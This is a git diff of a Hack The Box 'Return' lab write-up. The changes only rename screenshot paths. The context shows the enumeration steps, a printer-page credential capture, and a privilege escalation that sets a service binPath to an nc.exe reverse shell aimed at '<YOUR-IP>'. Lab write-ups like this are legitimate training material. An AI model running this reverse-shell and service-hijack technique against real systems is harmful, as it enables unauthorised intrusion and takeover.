@@ -63,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.10 seconds
 
 I then went on the IP Address and found this page:
 
-![](<../../.gitbook/assets/image (342) (1) (1).png>)
+![](<../../.gitbook/assets/image (342) (1) (1) (1).png>)
 
 I then ran **gobuster** on the IP Address: `gobuster dir -u 10.10.11.108 -w directory-list-2.3-big.txt -t 60`. I ended up with the following, which wasn't very helpful:
 
@@ -71,11 +71,11 @@ I then ran **gobuster** on the IP Address: `gobuster dir -u 10.10.11.108 -w dire
 
 I then tried found the nmap command to enumerate ldap: `nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' 10.10.11.108`.The nmap script was taking a while, so I went to the walk-through to see where I had gotten off of track. I found out that I should use **enum4linux** in order to enumerate for SMB: `enum4linux -a 10.10.11.108`. I then found this information:
 
-![](<../../.gitbook/assets/image (329) (1).png>)
+![](<../../.gitbook/assets/image (329) (1) (1).png>)
 
 The walk-through mentioned that we should enter our own IP Address in the **Server Address** section on the website. Using that I got a shell:
 
-![](<../../.gitbook/assets/image (345) (1) (1).png>)
+![](<../../.gitbook/assets/image (345) (1) (1) (1).png>)
 
 The walk-through then mentioned using the **evil-winrm** tool. I learned that, while I was able to overwrite the password for the svc-printer user, it would be overwritten by its own system. The walk-through pointed out that the password would be what is shown by the output of netcat connection previously:
 
@@ -95,7 +95,7 @@ Again, I had to view the write-up to see where to go from here. From the command
 
 `sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <YOUR-IP> 1234"`. After having a netcat listener setup on another tab, I was able to get a connection:
 
-![](<../../.gitbook/assets/image (330).png>)
+![](<../../.gitbook/assets/image (330) (1).png>)
 
 The official walk-through got me to become root, however, I was not able to do anything on the machine. I then found this [write-up](https://readysetexploit.wordpress.com/2021/10/12/hack-the-box-return/) that helped me setup a proper shell. Here are the commands I used:
 
@@ -119,4 +119,4 @@ sc.exe start VSS
 
 I was then able to get the root.txt file:
 
-![](<../../.gitbook/assets/image (332) (1).png>)
+![](<../../.gitbook/assets/image (332) (1) (1).png>)
